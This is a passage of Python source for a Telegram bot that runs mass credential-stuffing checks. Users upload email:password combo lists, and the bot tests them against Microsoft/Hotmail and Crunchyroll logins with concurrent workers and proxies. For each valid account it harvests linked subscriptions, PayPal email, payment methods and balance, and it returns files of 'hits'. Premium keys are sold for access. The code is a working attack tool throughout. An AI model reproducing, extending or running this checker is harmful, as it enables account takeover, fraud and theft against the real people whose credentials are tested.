            response = f"❌ INVALID ACCOUNT\n━━━━━━━━━━━━━━━\n📧 Email: {email}\n🔑 Status: {result.status}"
        
        await checking_msg.edit_text(response, parse_mode='Markdown')
    except Exception as e:
        await checking_msg.edit_text(f"❌ Error: {str(e)}")

async def check_microsoft_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Microsoft checker - supports file, text, and reply to file"""
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    user_id = update.effective_user.id
    
    # Check if this is a reply to a file
    if update.message.reply_to_message and update.message.reply_to_message.document:
        await mass_check_microsoft_file(update, context)
        return
    
    # Check if user sent a file with the command
    if update.message.document:
        await mass_check_microsoft_file(update, context)
        return
    
    # Check if user provided accounts as text/arguments
    if context.args:
        accounts_text = ' '.join(context.args)
        accounts = [acc.strip() for acc in accounts_text.split(',') if acc.strip()]
        if len(accounts) > 5000 and not is_admin(user_id):
            await update.message.reply_text("❌ Max 5000 accounts for users! Admins have no limit.")
            return
        context.user_data['accounts'] = accounts
        await process_microsoft_accounts(update, context)
        return
    
    # Show usage instructions
    await update.message.reply_text(
        "📋 Mass Microsoft Checker\n\n"
        "𝗨𝘀𝗮𝗴𝗲:\n"
        "1️⃣ Reply to a file with /mss\n"
        "2️⃣ Send file with /mss as caption\n"
        "3️⃣ /mss email:pass,email:pass\n"
        "4️⃣ Send text with accounts (one per line)\n\n"
        "𝗙𝗼𝗿𝗺𝗮𝘁: email:password or email|password\n"
        "𝗠𝗮𝘅: 5000 for users, unlimited for admins"
    )
    return MS_WAITING_ACCOUNTS

async def process_microsoft_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    accounts = context.user_data.get('accounts', [])
    
    if not accounts:
        await update.message.reply_text("❌ No accounts provided!")
        return
    
    proxies = [MS_GLOBAL_SETTINGS['proxy']] if MS_GLOBAL_SETTINGS['proxy'] else None
    
    hits = []
    hits_detailed = []
    twofa = []
    invalid = []
    errors = []
    checked_count = [0]  # Use list to allow modification in nested function
    msg = await update.message.reply_text(f"⏳ Starting check...\n📋 Total: {len(accounts)} accounts\n⚡ Using 25 workers")
    
    try:
        async def check_single_account(account, checker):
            """Check a single account and update counters"""
            try:
                if ':' in account:
                    email, password = account.split(':', 1)
                elif '|' in account:
                    email, password = account.split('|', 1)
                else:
                    invalid.append(f"INVALID_FORMAT:{account}")
                    checked_count[0] += 1
                    return
                
                result = await checker.check_account(email.strip(), password.strip())
                
                if result.status == "SUCCESS":
                    hit_line = f"{email}:{password}"
                    details = []
                    
                    if result.name:
                        details.append(f"Name={result.name}")
                    if result.country:
                        details.append(f"Country={result.country}")
                    
                    subs = []
                    if result.netflix_subscription:
                        subs.append("Netflix")
                    if result.disney_subscription:
                        subs.append("Disney+")
                    if result.xbox_linked:
                        subs.append("Xbox")
                    if result.paypal_email:
                        subs.append(f"PayPal({result.paypal_email})")
                    if result.supercell_linked:
                        subs.append("Supercell")
                    
                    if subs:
                        details.append(f"Subs=[{','.join(subs)}]")
                    
                    if result.payment_balance:
                        details.append(f"Balance=${result.payment_balance}")
                    
                    if result.payment_methods:
                        details.append(f"PayMethods={','.join(result.payment_methods)}")
                    
                    if result.total_orders:
                        details.append(f"Orders={result.total_orders}")
                    
                    if result.unread_messages is not None:
                        details.append(f"Unread={result.unread_messages}")
                    
                    if details:
                        hit_line += f" | {' | '.join(details)}"
                    
                    hits.append(f"{email}:{password}")
                    hits_detailed.append(hit_line)
                elif result.status == "2FACTOR":
                    twofa.append(f"2FA:{email}:{password}")
                elif result.status in ["INVALID", "INCORRECT"]:
                    invalid.append(f"{result.status}:{email}:{password}")
                else:
                    invalid.append(f"{result.status}:{email}:{password}")
                
                checked_count[0] += 1
            except Exception as e:
                errors.append(f"ERROR:{account}")
                checked_count[0] += 1
                logger.error(f"Error checking {account}: {e}")
        
        # Create 25 workers
        checker = AdvancedHotmailChecker(proxies=proxies)
        
        # Process in batches with 25 concurrent workers
        batch_size = 25
        last_update_time = [0]  # Track last update time to avoid rate limits
        
        for i in range(0, len(accounts), batch_size):
            batch = accounts[i:i + batch_size]
            tasks = [check_single_account(acc, checker) for acc in batch]
            await asyncio.gather(*tasks)
            
            # Update progress after each batch (with rate limit check)
            import time
            current_time = time.time()
            if current_time - last_update_time[0] >= 2:  # Update max every 2 seconds
                try:
                    percentage = int((checked_count[0] / len(accounts)) * 100)
                    progress_bar = "█" * (percentage // 5) + "░" * (20 - (percentage // 5))
                    
                    await msg.edit_text(
                        f"⚡ 𝗟𝗜𝗩𝗘 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 ⚡\n\n"
                        f"[{progress_bar}] {percentage}%\n"
                        f"🔄 {checked_count[0]}/{len(accounts)} checked\n\n"
                        f"✅ {len(hits)} • ⚠️ {len(twofa)} • ❌ {len(invalid)} • ⚡ {len(errors)}"
                    )
                    last_update_time[0] = current_time
                except Exception as e:
                    logger.error(f"Failed to update progress message: {e}")
        
        # Final summary
        total_checked = len(hits) + len(twofa) + len(invalid) + len(errors)
        stats_msg = "✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n\n"
        stats_msg += f"📊 Checked: {total_checked}/{len(accounts)}\n"
        stats_msg += f"[████████████████████] 100%\n\n"
        stats_msg += f"✅ {len(hits)} • ⚠️ {len(twofa)} • ❌ {len(invalid)} • ⚡ {len(errors)}\n"
        
        if hits:
            stats_msg += f"\n\n🎯 Top {min(3, len(hits_detailed))} Hits:\n"
            for idx, hit_detail in enumerate(hits_detailed[:3], 1):
                stats_msg += f"{idx}. {hit_detail[:80]}...\n" if len(hit_detail) > 80 else f"{idx}. {hit_detail}\n"
            if len(hits_detailed) > 3:
                stats_msg += f"\n+{len(hits_detailed) - 3} more in files below 👇"
        
        await msg.edit_text(stats_msg)
        
        # Send result files
        if hits:
            hits_txt = '\n'.join(hits)
            await update.message.reply_document(
                document=hits_txt.encode(),
                filename=f"ms_success_{user_id}.txt",
                caption=f"✅ SUCCESS ({len(hits)} accounts)"
            )
            
            hits_detailed_txt = '\n'.join(hits_detailed)
            await update.message.reply_document(
                document=hits_detailed_txt.encode(),
                filename=f"ms_success_detailed_{user_id}.txt",
                caption=f"✅ SUCCESS DETAILED ({len(hits)} accounts)\n📋 Netflix, Disney+, Xbox, PayPal, Supercell, Balance"
            )
        
        if twofa:
            twofa_txt = '\n'.join(twofa)
            await update.message.reply_document(
                document=twofa_txt.encode(),
                filename=f"ms_2fa_{user_id}.txt",
                caption=f"⚠️ 2FA ENABLED ({len(twofa)} accounts)"
            )
        
        if invalid:
            invalid_txt = '\n'.join(invalid)
            await update.message.reply_document(
                document=invalid_txt.encode(),
                filename=f"ms_invalid_{user_id}.txt",
                caption=f"❌ INVALID ({len(invalid)} accounts)"
            )
        
        if errors:
            errors_txt = '\n'.join(errors)
            await update.message.reply_document(
                document=errors_txt.encode(),
                filename=f"ms_errors_{user_id}.txt",
                caption=f"⚡ ERRORS ({len(errors)} accounts)"
            )
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)}")

async def mass_check_microsoft_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass Microsoft check from file (direct upload or reply)"""
    user_id = update.effective_user.id
    
    # Check if replying to a file
    if update.message.reply_to_message and update.message.reply_to_message.document:
        file_message = update.message.reply_to_message
    elif update.message.document:
        file_message = update.message
    else:
        await update.message.reply_text("❌ No file found! Reply to a file or send one with /mss")
        return
    
    try:
        # Download and read the file
        file = await context.bot.get_file(file_message.document.file_id)
        file_content = await file.download_as_bytearray()
        accounts_text = file_content.decode('utf-8', errors='ignore')
        
        # Parse accounts from file
        accounts = []
        for line in accounts_text.split('\n'):
            line = line.strip()
            if line and (':' in line or '|' in line):
                accounts.append(line)
        
        if not accounts:
            await update.message.reply_text("❌ No valid accounts found in file!\n\n📋 Format: email:password or email|password (one per line)")
            return
        
        if len(accounts) > 5000 and not is_admin(user_id):
            await update.message.reply_text(f"❌ File contains {len(accounts)} accounts!\n\n✅ Max: 5000 for users, unlimited for admins")
            return
        
        # Start checking process with 25 concurrent workers
        proxies = [MS_GLOBAL_SETTINGS['proxy']] if MS_GLOBAL_SETTINGS['proxy'] else None
        
        hits = []
        hits_detailed = []
        twofa = []
        invalid = []
        errors = []
        checked_count = [0]
        msg = await update.message.reply_text(f"⏳ Processing file...\n📋 Found {len(accounts)} accounts\n⚡ Using 25 workers")
        
        async def check_single_account(account, checker):
            """Check a single account and update counters"""
            try:
                if ':' in account:
                    email, password = account.split(':', 1)
                elif '|' in account:
                    email, password = account.split('|', 1)
                else:
                    invalid.append(f"INVALID_FORMAT:{account}")
                    checked_count[0] += 1
                    return
                
                result = await checker.check_account(email.strip(), password.strip())
                
                if result.status == "SUCCESS":
                    hit_line = f"{email}:{password}"
                    details = []
                    
                    if result.name:
                        details.append(f"Name={result.name}")
                    if result.country:
                        details.append(f"Country={result.country}")
                    
                    subs = []
                    if result.netflix_subscription:
                        subs.append("Netflix")
                    if result.disney_subscription:
                        subs.append("Disney+")
                    if result.xbox_linked:
                        subs.append("Xbox")
                    if result.paypal_email:
                        subs.append(f"PayPal({result.paypal_email})")
                    if result.supercell_linked:
                        subs.append("Supercell")
                    
                    if subs:
                        details.append(f"Subs=[{','.join(subs)}]")
                    
                    if result.payment_balance:
                        details.append(f"Balance=${result.payment_balance}")
                    
                    if result.payment_methods:
                        details.append(f"PayMethods={','.join(result.payment_methods)}")
                    
                    if result.total_orders:
                        details.append(f"Orders={result.total_orders}")
                    
                    if result.unread_messages is not None:
                        details.append(f"Unread={result.unread_messages}")
                    
                    if details:
                        hit_line += f" | {' | '.join(details)}"
                    
                    hits.append(f"{email}:{password}")
                    hits_detailed.append(hit_line)
                elif result.status == "2FACTOR":
                    twofa.append(f"2FA:{email}:{password}")
                elif result.status in ["INVALID", "INCORRECT"]:
                    invalid.append(f"{result.status}:{email}:{password}")
                else:
                    invalid.append(f"{result.status}:{email}:{password}")
                
                checked_count[0] += 1
            except Exception as e:
                errors.append(f"ERROR:{account}")
                checked_count[0] += 1
                logger.error(f"Error checking {account}: {e}")
        
        # Process with 25 concurrent workers
        checker = AdvancedHotmailChecker(proxies=proxies)
        batch_size = 25
        last_update_time = [0]  # Track last update time to avoid rate limits
        
        for i in range(0, len(accounts), batch_size):
            batch = accounts[i:i + batch_size]
            tasks = [check_single_account(acc, checker) for acc in batch]
            await asyncio.gather(*tasks)
            
            # Update progress after each batch (with rate limit check)
            import time
            current_time = time.time()
            if current_time - last_update_time[0] >= 2:  # Update max every 2 seconds
                try:
                    percentage = int((checked_count[0] / len(accounts)) * 100)
                    progress_bar = "█" * (percentage // 5) + "░" * (20 - (percentage // 5))
                    
                    await msg.edit_text(
                        f"⚡ 𝗟𝗜𝗩𝗘 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 ⚡\n\n"
                        f"[{progress_bar}] {percentage}%\n"
                        f"🔄 {checked_count[0]}/{len(accounts)} checked\n\n"
                        f"✅ {len(hits)} • ⚠️ {len(twofa)} • ❌ {len(invalid)} • ⚡ {len(errors)}"
                    )
                    last_update_time[0] = current_time
                except Exception as e:
                    logger.error(f"Failed to update progress message: {e}")
        
        # Final summary
        total_checked = len(hits) + len(twofa) + len(invalid) + len(errors)
        stats_msg = "✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n\n"
        stats_msg += f"📊 Checked: {total_checked}/{len(accounts)}\n"
        stats_msg += f"[████████████████████] 100%\n\n"
        stats_msg += f"✅ {len(hits)} • ⚠️ {len(twofa)} • ❌ {len(invalid)} • ⚡ {len(errors)}\n"
        
        if hits:
            stats_msg += f"\n\n🎯 Top {min(3, len(hits_detailed))} Hits:\n"
            for idx, hit_detail in enumerate(hits_detailed[:3], 1):
                stats_msg += f"{idx}. {hit_detail[:80]}...\n" if len(hit_detail) > 80 else f"{idx}. {hit_detail}\n"
            if len(hits_detailed) > 3:
                stats_msg += f"\n+{len(hits_detailed) - 3} more in files below 👇"
        
        await msg.edit_text(stats_msg)
        
        # Send result files
        if hits:
            hits_txt = '\n'.join(hits)
            await update.message.reply_document(
                document=hits_txt.encode(),
                filename=f"ms_success_{user_id}.txt",
                caption=f"✅ SUCCESS ({len(hits)} accounts)"
            )
            
            hits_detailed_txt = '\n'.join(hits_detailed)
            await update.message.reply_document(
                document=hits_detailed_txt.encode(),
                filename=f"ms_success_detailed_{user_id}.txt",
                caption=f"✅ SUCCESS DETAILED ({len(hits)} accounts)\n📋 Netflix, Disney+, Xbox, PayPal, Supercell, Balance"
            )
        
        if twofa:
            twofa_txt = '\n'.join(twofa)
            await update.message.reply_document(
                document=twofa_txt.encode(),
                filename=f"ms_2fa_{user_id}.txt",
                caption=f"⚠️ 2FA ENABLED ({len(twofa)} accounts)"
            )
        
        if invalid:
            invalid_txt = '\n'.join(invalid)
            await update.message.reply_document(
                document=invalid_txt.encode(),
                filename=f"ms_invalid_{user_id}.txt",
                caption=f"❌ INVALID ({len(invalid)} accounts)"
            )
        
        if errors:
            errors_txt = '\n'.join(errors)
            await update.message.reply_document(
                document=errors_txt.encode(),
                filename=f"ms_errors_{user_id}.txt",
                caption=f"⚡ ERRORS ({len(errors)} accounts)"
            )
            
    except Exception as e:
        logger.error(f"Error in mass_check_microsoft_file: {e}")
        await update.message.reply_text(f"❌ Error processing file: {str(e)}")

async def receive_microsoft_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not update.message:
        await update.effective_chat.send_message("❌ Invalid message!")
        return MS_WAITING_ACCOUNTS
    
    # Handle file uploads
    if update.message.document:
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            file_content = await file.download_as_bytearray()
            accounts_text = file_content.decode('utf-8', errors='ignore')
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return MS_WAITING_ACCOUNTS
    elif update.message.text:
        # Handle text messages
        accounts_text = update.message.text
    else:
        await update.message.reply_text("❌ Please send text or a file!")
        return MS_WAITING_ACCOUNTS
    
    accounts = []
    for line in accounts_text.split('\n'):
        line = line.strip()
        if line and (':' in line or '|' in line):
            accounts.append(line)
        elif ',' in accounts_text:
            accounts = [acc.strip() for acc in accounts_text.split(',') if acc.strip()]
            break
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found! Please send in format: email:password")
        return MS_WAITING_ACCOUNTS
    
    if len(accounts) > 5000 and not is_admin(user_id):
        await update.message.reply_text("❌ Max 5000 accounts for users! Admins have no limit.")
        return MS_WAITING_ACCOUNTS
    
    context.user_data['accounts'] = accounts
    await process_microsoft_accounts(update, context)
    return ConversationHandler.END

async def cancel_microsoft(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Microsoft mass check cancelled!")
    context.user_data.clear()
    return ConversationHandler.END

async def receive_crunchyroll_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not update.message:
        await update.effective_chat.send_message("❌ Invalid message!")
        return CR_WAITING_ACCOUNTS
    
    if update.message.document:
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            file_content = await file.download_as_bytearray()
            accounts_text = file_content.decode('utf-8', errors='ignore')
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return CR_WAITING_ACCOUNTS
    elif update.message.text:
        accounts_text = update.message.text
    else:
        await update.message.reply_text("❌ Please send text or a file!")
        return CR_WAITING_ACCOUNTS
    
    accounts = []
    for line in accounts_text.split('\n'):
        line = line.strip()
        if line and (':' in line or '|' in line):
            accounts.append(line)
        elif ',' in accounts_text:
            accounts = [acc.strip() for acc in accounts_text.split(',') if acc.strip()]
            break
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found! Please send in format: email:password")
        return CR_WAITING_ACCOUNTS
    
    if len(accounts) > 5000 and not is_admin(user_id):
        await update.message.reply_text("❌ Max 5000 accounts for users! Admins have no limit.")
        return CR_WAITING_ACCOUNTS
    
    context.user_data['accounts'] = accounts
    await process_crunchyroll_accounts(update, context)
    return ConversationHandler.END

async def process_crunchyroll_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    accounts = context.user_data.get('accounts', [])
    
    if not accounts:
        await update.message.reply_text("❌ No accounts provided!")
        return
    
    hits = []
    hits_detailed = []
    fails = []
    msg = await update.message.reply_text(f"⏳ Checking 0/{len(accounts)} accounts...")
    
    checker = None
    try:
        checker = CrunchyrollChecker(use_proxy=False)
        await checker.get_session()
        
        for idx, account in enumerate(accounts, 1):
            try:
                if ':' in account:
                    email, password = account.split(':', 1)
                elif '|' in account:
                    email, password = account.split('|', 1)
                else:
                    fails.append(f"INVALID:{account}")
                    continue
                
                result = await checker.check_account(email.strip(), password.strip())
                
                if result.get('success'):
                    hit_line = f"{email}:{password}"
                    details = []
                    
                    if result.get('username'):
                        details.append(f"User={result['username']}")
                    if result.get('email'):
                        details.append(f"Email={result['email']}")
                    if result.get('subscription'):
                        details.append(f"Sub={result['subscription']}")
                    if result.get('country'):
                        details.append(f"Country={result['country']}")
                    
                    if details:
                        hit_line += f" | {' | '.join(details)}"
                    
                    hits.append(f"{email}:{password}")
                    hits_detailed.append(hit_line)
                else:
                    status = result.get('status', 'UNKNOWN')
                    fails.append(f"{status}:{email}:{password}")
                
                if idx % 10 == 0:
                    await msg.edit_text(f"⏳ Checking {idx}/{len(accounts)} accounts...\n✅ Hits: {len(hits)}\n❌ Fails: {len(fails)}")
            except Exception as e:
                fails.append(f"ERROR:{account}")
        
        stats_msg = "✅ 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n"
        stats_msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        stats_msg += f"✅ Hits: {len(hits)}\n"
        stats_msg += f"❌ Fails: {len(fails)}\n"
        stats_msg += f"📊 Total: {len(accounts)}\n"
        stats_msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        
        if hits:
            stats_msg += "\n📋 DETAILED HITS:\n"
            for idx, hit_detail in enumerate(hits_detailed[:5], 1):
                stats_msg += f"\n{idx}. {hit_detail}\n"
            if len(hits_detailed) > 5:
                stats_msg += f"\n... and {len(hits_detailed) - 5} more in the file"
        
        await msg.edit_text(stats_msg)
        
        if hits:
            hits_txt = '\n'.join(hits)
            await update.message.reply_document(
                document=hits_txt.encode(),
                filename=f"crunchyroll_hits_{user_id}.txt",
                caption="✅ VALID CRUNCHYROLL ACCOUNTS (Simple)"
            )
            
            hits_detailed_txt = '\n'.join(hits_detailed)
            await update.message.reply_document(
                document=hits_detailed_txt.encode(),
                filename=f"crunchyroll_hits_detailed_{user_id}.txt",
                caption="✅ VALID CRUNCHYROLL ACCOUNTS (Full Info)"
            )
        
        if fails:
            fails_txt = '\n'.join(fails)
            await update.message.reply_document(
                document=fails_txt.encode(),
                filename=f"crunchyroll_invalid_{user_id}.txt",
                caption="❌ INVALID/ERROR"
            )
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)}")
    finally:
        if checker:
            await checker.close_session()

async def cancel_crunchyroll(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Crunchyroll mass check cancelled!")
    context.user_data.clear()
    return ConversationHandler.END

async def set_ms_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not context.args:
        current = MS_GLOBAL_SETTINGS['proxy'] or "None"
        await update.message.reply_text(f"🌐 Current Proxy: {current}\n\nUsage: /smp proxy_url")
        return
    
    proxy = ' '.join(context.args)
    MS_GLOBAL_SETTINGS['proxy'] = proxy
    await update.message.reply_text(f"✅ Proxy updated!\n🌐 {proxy}")

async def addgroup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start /addgroup conversation"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return ConversationHandler.END
    
    await update.message.reply_text(
        "📝 **Add Authorized Group**\n\n"
        "Please send the group invite link:"
    )
    return WAITING_GROUP_LINK

async def receive_group_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive group link and ask for ID"""
    context.user_data['group_link'] = update.message.text
    
    await update.message.reply_text(
        "✅ Link received!\n\n"
        "Now please send the group ID (numeric):\n"
        "Example: -1001234567890"
    )
    return WAITING_GROUP_ID

async def receive_group_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive group ID and save"""
    try:
        group_id = int(update.message.text.strip())
        group_link = context.user_data.get('group_link', '')
        admin_username = update.effective_user.username or update.effective_user.first_name
        
        add_authorized_group(group_id, group_link, admin_username)
        
        await update.message.reply_text(
            "✅ **Group Added Successfully!**\n\n"
            f"🔗 Link: {group_link}\n"
            f"🆔 ID: {group_id}\n"
            f"👤 Added by: @{admin_username}\n\n"
            "Users can now use the bot in this group!"
        )
        
        context.user_data.clear()
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid group ID! Please send a numeric ID.\n"
            "Example: -1001234567890"
        )
        return WAITING_GROUP_ID

async def cancel_addgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel /addgroup conversation"""
    await update.message.reply_text("❌ Cancelled!")
    context.user_data.clear()
    return ConversationHandler.END

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate premium keys - /key <quantity> <days>"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /key <quantity> <days>\n"
            "Example: /key 1 30"
        )
        return
    
    try:
        quantity = int(context.args[0])
        days = int(context.args[1])
        
        if quantity < 1 or days < 1:
            await update.message.reply_text("❌ Quantity and days must be positive numbers!")
            return
        
        admin_username = update.effective_user.username or update.effective_user.first_name
        key_code = generate_premium_key(quantity, days, admin_username)
        
        await update.message.reply_text(
            "🔑 **Key created successfully**\n\n"
            "———•————•—\n"
            f"🔑 Key: `{key_code}`\n"
            "—○——○——○——○—\n"
            f"📋 Quantity: {quantity}\n"
            f"⌛ Expires In: {days} days\n"
            f"👤 Key Created By: @{admin_username}\n"
            f"🎁 Created At: {datetime.now().strftime('%m/%d/%Y %I:%M %p')}\n\n"
            "☆🤔 How to redeem?\n\n"
            "🥂 Use: /redeem <key> to activate premium",
            parse_mode='Markdown'
        )
        
    except ValueError:
        await update.message.reply_text("❌ Please provide valid numbers for quantity and days!")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users - /broadcast <message>"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "   📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗\n"
            "╚══════════════════════════╝\n\n"
            "📝 Usage:\n"
            "`/broadcast <your message>`\n\n"
            "Example:\n"
            "`/broadcast Hello everyone! Bot is updated.`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 This will send the message to all registered users."
        )
        return
    
    message = ' '.join(context.args)
    users = load_users()
    
    if not users:
        await update.message.reply_text("❌ No users registered yet!")
        return
    
    status_msg = await update.message.reply_text(
        f"📤 Broadcasting to {len(users)} users...\n⏳ Please wait..."
    )
    
    success_count = 0
    failed_count = 0
    
    broadcast_message = (
        "╔════════════════════════════╗\n"
        "   📢 𝗔𝗗𝗠𝗜𝗡 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n"
        "╚════════════════════════════╝\n\n"
        f"{message}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 {datetime.now().strftime('%m/%d/%Y %I:%M %p')}\n"
        f"👤 From: @{ADMIN_USERNAME}"
    )
    
    for user_id, user_data in users.items():
        try:
            await context.bot.send_message(
                chat_id=int(user_id),
                text=broadcast_message
            )
            success_count += 1
        except Exception as e:
            failed_count += 1
            logger.warning(f"Failed to send to {user_id}: {e}")
    
    await status_msg.edit_text(
        "╔════════════════════════════╗\n"
        "   ✅ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n"
        "╚════════════════════════════╝\n\n"
        f"📊 Total Users: {len(users)}\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {failed_count}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 {datetime.now().strftime('%m/%d/%Y %I:%M %p')}"
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics - /stats"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    users = load_users()
    authorized_groups = get_authorized_groups()
    
    from access_control import load_access_data
    access_data = load_access_data()
    premium_keys = access_data.get('premium_keys', {})
    premium_users = access_data.get('premium_users', {})
    
    total_keys = len(premium_keys)
    active_premium = len(premium_users)
    total_key_uses = sum(key.get('quantity', 0) - key.get('remaining_uses', 0) for key in premium_keys.values())
    
    stats_message = (
        "╔════════════════════════════╗\n"
        "   📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦\n"
        "╚════════════════════════════╝\n\n"
        "👥 𝗨𝘀𝗲𝗿𝘀:\n"
        f"├ Total Users: {len(users)}\n"
        f"├ Premium Users: {active_premium}\n"
        f"└ Regular Users: {len(users) - active_premium}\n\n"
        "🏢 𝗚𝗿𝗼𝘂𝗽𝘀:\n"
        f"└ Authorized Groups: {len(authorized_groups)}\n\n"
        "🔑 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗞𝗲𝘆𝘀:\n"
        f"├ Total Keys Created: {total_keys}\n"
        f"├ Total Redeemed: {total_key_uses}\n"
        f"└ Active Premium: {active_premium}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 {datetime.now().strftime('%m/%d/%Y %I:%M %p')}\n"
        f"🤖 Bot Status: 🟢 Online"
    )
    
    await update.message.reply_text(stats_message)

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user list - /users"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    users = load_users()
    
    if not users:
        await update.message.reply_text("❌ No users registered yet!")
        return
    
    from access_control import load_access_data
    access_data = load_access_data()
    premium_users = access_data.get('premium_users', {})
    
    users_list = (
        "╔════════════════════════════╗\n"
        "   👥 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥𝗘𝗗 𝗨𝗦𝗘𝗥𝗦\n"
        "╚════════════════════════════╝\n\n"
        f"📊 Total: {len(users)} users\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    for idx, (user_id, user_data) in enumerate(users.items(), 1):
        username = user_data.get('username', 'Unknown')
        registered_at = user_data.get('registered_at', 'N/A')
        is_premium = user_id in premium_users
        
        premium_badge = "💎" if is_premium else "👤"
        
        users_list += f"{premium_badge} {idx}. @{username}\n"
        users_list += f"   🆔 ID: {user_id}\n"
        
        if is_premium:
            expires = premium_users[user_id].get('expires_at', 'N/A')
            try:
                exp_date = datetime.fromisoformat(expires)
                users_list += f"   ⭐ Premium until: {exp_date.strftime('%m/%d/%Y')}\n"
            except:
                users_list += f"   ⭐ Premium: Active\n"
        
        users_list += "\n"
        
        if idx >= 20:
            users_list += f"... and {len(users) - 20} more users\n"
            break
    
    users_list += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    users_list += "💎 = Premium User | 👤 = Regular User"
    
    await update.message.reply_text(users_list)

async def groups_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show authorized groups list - /groups"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    authorized_groups = get_authorized_groups()
    
    if not authorized_groups:
        await update.message.reply_text("❌ No authorized groups yet! Use /addgroup to add one.")
        return
    
    groups_list = (
        "╔═══════════════════════════════╗\n"
        "   🏢 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n"
        "╚═══════════════════════════════╝\n\n"
        f"📊 Total: {len(authorized_groups)} groups\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    for idx, (group_id, group_info) in enumerate(authorized_groups.items(), 1):
        invite_link = group_info.get('invite_link', 'N/A')
        added_by = group_info.get('added_by', 'Unknown')
        added_at = group_info.get('added_at', 'N/A')
        
        groups_list += f"🏢 Group {idx}\n"
        groups_list += f"├ 🆔 ID: `{group_id}`\n"
        groups_list += f"├ 🔗 Link: {invite_link}\n"
        groups_list += f"├ 👤 Added by: @{added_by}\n"
        groups_list += f"└ 📅 Date: {added_at}\n\n"
    
    groups_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    groups_list += "💡 Use /removegroup <id> to remove a group"
    
    await update.message.reply_text(groups_list, parse_mode='Markdown')

async def removegroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove authorized group - /removegroup <group_id>"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
